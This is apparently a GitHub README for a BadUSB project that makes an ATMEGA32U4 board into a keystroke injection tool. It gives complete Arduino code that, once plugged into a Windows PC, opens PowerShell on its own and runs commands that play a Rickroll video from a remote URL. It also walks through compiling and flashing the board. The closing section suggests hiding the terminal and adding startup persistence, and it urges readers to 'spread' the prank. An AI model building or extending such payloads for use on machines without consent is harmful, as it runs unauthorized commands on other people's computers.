# **HiLetGo BadUSB Beetle - Windows Keystroke Injection**

## **Overview**
This project turns the **HiLetgo BadUSB Beetle (ATMEGA32U4)** into a **keystroke injection attack tool**. Includes example payloads like the Windows-specific "Rickroll" that automatically opens and plays a Rickroll video using **PowerShell**. The payload will attempt to play the video in **Microsoft Edge (Kiosk Mode)**, and if Edge is unavailable, it will use **Windows Media Player**.

## **⚠️ Disclaimer**
This tool is for **educational and ethical hacking purposes only**. Do not use this on systems you do not own or have explicit permission to test. The misuse of this tool may result in legal consequences.

---

## **🔧 Requirements**
- **HiLetgo BadUSB Beetle (ATMEGA32U4)** or any ATMEGA32U4-based board
- **Arduino-CLI installed**
- **Windows PC for execution**
- **USB cable for flashing the board (if applicable)**

---

## **🛠️ Installation & Setup**
### **Step 1: Install Arduino-CLI**
Arduino-CLI is required to compile and upload the script to the BadUSB device.

Run the following command to install Arduino-CLI:
```bash
curl -fsSL https://raw.githubusercontent.com/arduino/arduino-cli/master/install.sh | sh
```
Verify the installation:
```bash
arduino-cli version
```

### **Step 2: Configure Arduino-CLI**
Initialize the configuration file:
```bash
arduino-cli config init
```
Update the core index and install support for ATMEGA32U4 boards:
```bash
arduino-cli core update-index
arduino-cli core install arduino:avr
```

### **Step 3: Check If Your Board is Detected**
Plug in your HiLetgo BadUSB Beetle and run:
```bash
arduino-cli board list
```
If detected, you should see an output like:
```
Port         Type              Board Name  
/dev/ttyACM0 Serial Port      Arduino Micro
```

---

## **📜 Writing the Rickroll Keystroke Injection Script**
### **1️⃣ Create a New Sketch**
Create a new file called `rickroll.ino` and paste the following script:

```cpp
#include "Keyboard.h"

void setup() {
    delay(3000); // Wait for system to be ready
    Keyboard.begin();

    // Open Run Dialog (Win + R)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(500);

    // Open PowerShell
    Keyboard.print("powershell");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(1500);

    // Command to play video in Microsoft Edge Kiosk Mode
    Keyboard.print("Start-Process msedge.exe -ArgumentList \"--kiosk https://shattereddisk.github.io/rickroll/rickroll.mp4 --edge-kiosk-type=fullscreen\"");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(1000);

    // If Edge is unavailable, use Windows Media Player
    Keyboard.print("$wmp = New-Object -ComObject WMPlayer.OCX; $wmp.URL = 'https://shattereddisk.github.io/rickroll/rickroll.mp4'; $wmp.controls.play();");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(1000);

    // Exit PowerShell
    Keyboard.print("exit");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    Keyboard.end();
}

void loop() {}
```

---

## **🛠️ Compiling & Uploading the Script**
### **Step 1: Compile the Script**
Run the following command to compile the script for the **ATMEGA32U4**:
```bash
arduino-cli compile --fqbn arduino:avr:micro rickroll.ino
```
If your board uses the **Leonardo bootloader**, use:
```bash
arduino-cli compile --fqbn arduino:avr:leonardo rickroll.ino
```

### **Step 2: Upload the Script to the BadUSB Device**
```bash
arduino-cli upload -p /dev/ttyACM0 --fqbn arduino:avr:micro rickroll.ino
```
Replace `/dev/ttyACM0` with the correct port detected earlier.

---

## **🚀 Executing the Payload**
1. **Plug the BadUSB into a Windows PC**.
2. The script will automatically execute after a **3-second delay**.
3. It will:
   - Open **PowerShell**.
   - Launch **Microsoft Edge in Kiosk Mode** to play the Rickroll.
   - If Edge isn’t installed, it will attempt to use **Windows Media Player**.
4. The video should start playing automatically!

---

## **🎯 Troubleshooting**
### **1. The Payload Doesn't Execute**
- Ensure the script is **compiled and uploaded correctly**.
- Verify that **Arduino-CLI detects the board** with `arduino-cli board list`.
- Try increasing the delay (`delay(3000);` to `delay(5000);`) in `setup()`.

### **2. Edge Doesn’t Open in Kiosk Mode**
- Ensure **Microsoft Edge is installed** by running:
  ```powershell
  Start-Process msedge.exe
  ```
- If Edge isn’t installed, the script will automatically fall back to **Windows Media Player**.

### **3. Windows Media Player Doesn't Play the Video**
- Some Windows installations have **WMP disabled**. Try enabling it:
  ```powershell
  Start-Process wmplayer.exe
  ```

---

## **📌 Additional Enhancements**
- **Make it more stealthy**: Modify PowerShell commands to **hide the terminal**.
- **Add persistence**: Create a scheduled task that **replays the video on startup**.
- **Fake error message**: Display a message before the video plays for more fun.

---

## **📢 Final Notes**
This is a **fun and harmless demonstration** of keystroke injection attacks using the **HiLetgo BadUSB Beetle**. It serves as an **educational tool** to understand how keystroke injection works and how Windows automation can be leveraged. Check the repo for additional payloads that work on Linux, MacOS and Windows.

For any issues or improvements, feel free to **submit a pull request** or **open an issue** on GitHub.

**🎥 Now go forth and spread the Rickroll!** 🎶😂


